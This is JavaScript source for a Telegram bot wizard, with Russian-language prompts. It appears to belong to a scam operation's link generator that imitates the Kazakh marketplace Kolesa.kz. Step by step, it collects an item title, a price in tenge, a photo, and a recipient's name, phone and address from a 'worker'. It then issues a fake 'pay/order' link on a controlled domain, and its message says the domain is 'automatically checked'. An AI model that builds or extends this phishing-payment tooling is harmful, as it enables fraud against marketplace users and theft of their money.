const { Markup } = require("telegraf");
const WizardScene = require("telegraf/scenes/wizard");

const { items, services, countries } = require("../../../../../database/index");
const getCurCode = require("../../../../functions/getCurCode");

function genId() {
  var result = "";
  var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
  var charactersLength = characters.length;
  for (var i = 0; i < 8; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

module.exports = new WizardScene(
  "create_kolesa1_kz",
  // Шаг 1: Выбор типа создания
  async (ctx) => {
    try {
      ctx.wizard.state.service = ctx.match[1];

      await ctx
        .editMessageText("🇰🇿 <b>Выберите тип создания ссылки</b>", {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton("🖊️ Ручной", "main"),
              Markup.callbackButton("🤖 Парсер", "parser"),
            ],
            [Markup.callbackButton("< Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);

      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      return ctx.scene.leave();
    }
  },
  // Шаг 2: Запрос названия или ссылки
  async (ctx) => {
    try {
      ctx.wizard.state.type = ctx.update.callback_query.data;

      if (ctx.update.callback_query.data == "main") {
        const msg = await ctx
          .editMessageText("🇰🇿 Введите название товара/автомобиля", {
            reply_markup: Markup.inlineKeyboard([
              [Markup.callbackButton("< Отменить", "cancel")],
            ]),
          })
          .catch((err) => err);

        ctx.wizard.state.msgId = msg.message_id;
      } else {
        const msg = await ctx
          .editMessageText("🇰🇿 Введите ссылку на объявление с Kolesa.kz", {
            reply_markup: Markup.inlineKeyboard([
              [Markup.callbackButton("< Отменить", "cancel")],
            ]),
          })
          .catch((err) => err);

        ctx.wizard.state.msgId = msg.message_id;
      }

      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      return ctx.scene.leave();
    }
  },
  // Шаг 3: Обработка названия/ссылки и запрос стоимости
  async (ctx) => {
    try {
      await ctx.deleteMessage().catch((err) => err);
      await ctx.deleteMessage(ctx.wizard.state.msgId).catch((err) => err);

      if (ctx.wizard.state.type == "main") {
        ctx.wizard.state.title = ctx.message.text;

        const msg = await ctx
          .replyWithHTML("🇰🇿 Введите стоимость (только число в тенге)", {
            reply_markup: Markup.inlineKeyboard([
              [Markup.callbackButton("< Отменить", "cancel")],
            ]),
          })
          .catch((err) => err);

        ctx.wizard.state.msgId = msg.message_id;
        return ctx.wizard.next();
      } else {
        // Парсер логика остается как есть
        let url;
        try {
          url = new URL(ctx.message.text);
        } catch (err) {
          await ctx
            .replyWithHTML("❌ Введите валидную ссылку")
            .catch((err) => err);
          return ctx.wizard.prevStep();
        }

        const service = await services.findOne({
          where: {
            code: ctx.wizard.state.service,
          },
        });

        const item = await items.create({
          id: genId(),
          workerId: ctx.from.id,
          title: "Парсер в разработке",
          photo: "https://i.imgur.com/RLDAtaZ.jpeg",
          price: "1000000",
          currency: service.currency,
          serviceCode: service.code,
          status: service.status,
          receiverName: "Получатель не указан",
          receiverPhone: "+7 777 000-00-00", 
          receiverAddress: "Адрес не указан",
        });

        try {
          const msg = await ctx.replyWithPhoto(
            { url: "https://i.imgur.com/RLDAtaZ.jpeg" },
            {
              caption: `<b>👻 Ссылка сгенерирована!</b>
            
🚘 <b>Сервис:</b> ${service.title} ${service.status == 'none' ? '' : service.status + '.0'}

▪️ <b>ID объявления:</b> #${item.id}
▪️ <b>Название:</b> Парсер в разработке
▪️ <b>Стоимость:</b> ${await getCurCode(service.currency)} 1,000,000

✔️ Домен автоматически проверен.`,
              parse_mode: "HTML",
              reply_markup: Markup.inlineKeyboard([
                [
                  Markup.urlButton(
                    "🔗 Перейти",
                    `https://${service.domain}/pay/order/${item.id}`
                  ),
                ],
                [Markup.callbackButton("🖊️ Цена", `changePrice_${item.id}`)],
                [Markup.callbackButton("< В меню", `menu`)],
              ]),
            }
          );
          await item.update({
            msgId: msg.message_id,
          });
        } catch (err) {
          console.log("Ошибка отправки изображения:", err);
        }

        return ctx.scene.leave();
      }
    } catch (err) {
      console.log(err);
      return ctx.scene.leave();
    }
  },
  // Шаг 4: Обработка стоимости и запрос фото
  async (ctx) => {
    try {
      await ctx.deleteMessage().catch((err) => err);
      await ctx.deleteMessage(ctx.wizard.state.msgId).catch((err) => err);

      ctx.wizard.state.price = parseFloat(ctx.message.text);

      if (isNaN(parseFloat(ctx.message.text))) {
        await ctx
          .replyWithHTML("❗️ Вы ввели не число, создание ссылки отменено", {
            reply_markup: Markup.inlineKeyboard([
              [Markup.callbackButton("< В меню", "menu")],
            ]),
          })
          .catch((err) => err);

        return ctx.scene.leave();
      } else {
        const msg = await ctx
          .replyWithHTML(
            "🇰🇿 Введите ссылку на изображение или нажмите 'Пропустить'",
            {
              reply_markup: Markup.inlineKeyboard([
                [Markup.callbackButton("Пропустить", "skip_photo")],
                [Markup.callbackButton("< Отменить", "cancel")],
              ]),
            }
          )
          .catch((err) => err);

        ctx.wizard.state.msgId = msg.message_id;
      }

      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      return ctx.scene.leave();
    }
  },
  // Шаг 5: Обработка фото и запрос имени получателя
  async (ctx) => {
    try {
      // Обработка пропуска фото через кнопку
      if (ctx.update.callback_query && ctx.update.callback_query.data === "skip_photo") {
        ctx.wizard.state.photo = null;
      } else if (ctx.message && ctx.message.text) {
        if (ctx.message.text.toLowerCase() === "пропустить") {
          ctx.wizard.state.photo = null;
        } else {
          ctx.wizard.state.photo = ctx.message.text;
        }
      }

      await ctx.deleteMessage().catch((err) => err);
      await ctx.deleteMessage(ctx.wizard.state.msgId).catch((err) => err);

      // Запрашиваем имя получателя
      const msg = await ctx
        .replyWithHTML("🇰🇿 Введите имя получателя", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("< Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);

      ctx.wizard.state.msgId = msg.message_id;
      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      return ctx.scene.leave();
    }
  },
  // Шаг 6: Обработка имени и запрос телефона
  async (ctx) => {
    try {
      await ctx.deleteMessage().catch((err) => err);
      await ctx.deleteMessage(ctx.wizard.state.msgId).catch((err) => err);

      ctx.wizard.state.receiverName = ctx.message.text;

      const msg = await ctx
        .replyWithHTML("🇰🇿 Введите телефон получателя", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("< Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);

      ctx.wizard.state.msgId = msg.message_id;
      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      return ctx.scene.leave();
    }
  },
  // Шаг 7: Обработка телефона и запрос адреса
  async (ctx) => {
    try {
      await ctx.deleteMessage().catch((err) => err);
      await ctx.deleteMessage(ctx.wizard.state.msgId).catch((err) => err);

      ctx.wizard.state.receiverPhone = ctx.message.text;

      const msg = await ctx
        .replyWithHTML("🇰🇿 Введите адрес доставки", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("< Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);

      ctx.wizard.state.msgId = msg.message_id;
      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      return ctx.scene.leave();
    }
  },
  // Шаг 8: Обработка адреса и создание ссылки
  async (ctx) => {
    try {
      await ctx.deleteMessage().catch((err) => err);
      await ctx.deleteMessage(ctx.wizard.state.msgId).catch((err) => err);

      ctx.wizard.state.receiverAddress = ctx.message.text;

      const service = await services.findOne({
        where: {
          code: ctx.wizard.state.service,
        },
      });

      const item = await items.create({
        id: genId(),
        workerId: ctx.from.id,
        title: ctx.wizard.state.title,
        photo: ctx.wizard.state.photo || "https://i.imgur.com/RLDAtaZ.jpeg",
        price: ctx.wizard.state.price,
        currency: service.currency,
        serviceCode: service.code,
        status: service.status,
        receiverName: ctx.wizard.state.receiverName,
        receiverPhone: ctx.wizard.state.receiverPhone,
        receiverAddress: ctx.wizard.state.receiverAddress,
      });

      // Отправляем результат
      if (ctx.wizard.state.photo && ctx.wizard.state.photo !== "https://i.imgur.com/RLDAtaZ.jpeg") {
        try {
          const msg = await ctx.replyWithPhoto(
            { url: ctx.wizard.state.photo },
            {
              caption: `<b>👻 Ссылка сгенерирована!</b>
            
🚘 <b>Сервис:</b> ${service.title} ${service.status == 'none' ? '' : service.status + '.0'}

▪️ <b>ID объявления:</b> #${item.id}
▪️ <b>Название:</b> ${ctx.wizard.state.title}
▪️ <b>Стоимость:</b> ${await getCurCode(service.currency)} ${parseInt(ctx.wizard.state.price).toLocaleString()}
▪️ <b>Получатель:</b> ${ctx.wizard.state.receiverName}

✔️ Домен автоматически проверен.`,
              parse_mode: "HTML",
              reply_markup: Markup.inlineKeyboard([
                [
                  Markup.urlButton(
                    "🔗 Перейти",
                    `https://${service.domain}/pay/order/${item.id}`
                  ),
                ],
                [Markup.callbackButton("🖊️ Цена", `changePrice_${item.id}`)],
                [Markup.callbackButton("< В меню", `menu`)],
              ]),
            }
          );
          await item.update({
            msgId: msg.message_id,
          });
        } catch (photoErr) {
          console.log("Ошибка загрузки изображения:", photoErr);
        }
      } else {
        const msg = await ctx.replyWithHTML(
          `<b>👻 Ссылка сгенерирована!</b>
            
🚘 <b>Сервис:</b> ${service.title} ${service.status == 'none' ? '' : service.status + '.0'}

▪️ <b>ID объявления:</b> #${item.id}
▪️ <b>Название:</b> ${ctx.wizard.state.title}
▪️ <b>Стоимость:</b> ${await getCurCode(service.currency)} ${parseInt(ctx.wizard.state.price).toLocaleString()}
▪️ <b>Получатель:</b> ${ctx.wizard.state.receiverName}

✔️ Домен автоматически проверен.`,
          {
            reply_markup: Markup.inlineKeyboard([
              [
                Markup.urlButton(
                  "🔗 Перейти",
                  `https://${service.domain}/pay/order/${item.id}`
                ),
              ],
              [Markup.callbackButton("🖊️ Цена", `changePrice_${item.id}`)],
              [Markup.callbackButton("< В меню", `menu`)],
            ]),
          }
        );
        await item.update({
          msgId: msg.message_id,
        });
      }

      return ctx.scene.leave();
    } catch (err) {
      console.log(err);
      return ctx.scene.leave();
    }
  }
);